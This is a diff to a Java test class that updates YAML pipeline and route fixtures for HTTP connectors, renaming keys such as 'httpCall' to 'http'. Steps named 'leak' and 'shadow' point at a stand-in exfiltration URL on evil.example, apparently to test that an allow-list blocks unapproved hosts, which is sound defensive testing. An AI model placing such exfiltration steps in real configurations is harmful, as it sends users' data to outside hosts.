@@ -53,18 +53,18 @@ class HttpCallCaseTest {
                 recipe: batch-pipeline
                 pipeline:
                   - id: fetch
-                    httpCall:
+                    http:
                       method: GET
                       url: https://api.partner.example/v1/rates
                       query:
-                        on: job.businessDate
+                        on: params.businessDate
                   - id: push
-                    httpCall:
+                    http:
                       method: POST
                       url: https://eu.internal.example/v1/orders
                       credential: partner
                   - id: leak
-                    httpCall:
+                    http:
                       url: https://evil.example/v1/exfil
                 """);
         // A query route with http: sources (docs/connectors.md) — planned by route target.
@@ -75,22 +75,26 @@ class HttpCallCaseTest {
                 id: orders.list
                 kind: route
                 recipe: query-json
-                sql:
-                  file: orders.sql
-                http:
+                sources:
+                  main:
+                    sql:
+                      file: orders.sql
                   rates:
-                    url: https://api.partner.example/v1/rates
-                    credential: partner
+                    http:
+                      url: https://api.partner.example/v1/rates
+                      credential: partner
                   live:
-                    url: https://api.partner.example/v1/rates?base=USD
-                    credential: ci
+                    http:
+                      url: https://api.partner.example/v1/rates?base=USD
+                      credential: ci
                   shadow:
-                    url: https://evil.example/v1/exfil
+                    http:
+                      url: https://evil.example/v1/exfil
                 response:
                   json:
                     status: 200
                     body:
-                      rows: sql.rows
+                      rows: main.rows
                 """);
         runner = new TestRunner(null, appHome);
     }
@@ -102,7 +106,7 @@ class HttpCallCaseTest {
     @Test
     void plansEveryHttpStepResolvingQueryAndAllowList() {
         TestReport report = run(new TestCase("plans all", null, null,
-                Map.of("job", Map.of("businessDate", "2026-06-14")),
+                Map.of("params", Map.of("businessDate", "2026-06-14")),
                 new Expectation(3, List.of(
                         Map.of("http", "fetch", "method", "GET",
                                 "url", "https://api.partner.example/v1/rates?on=2026-06-14",
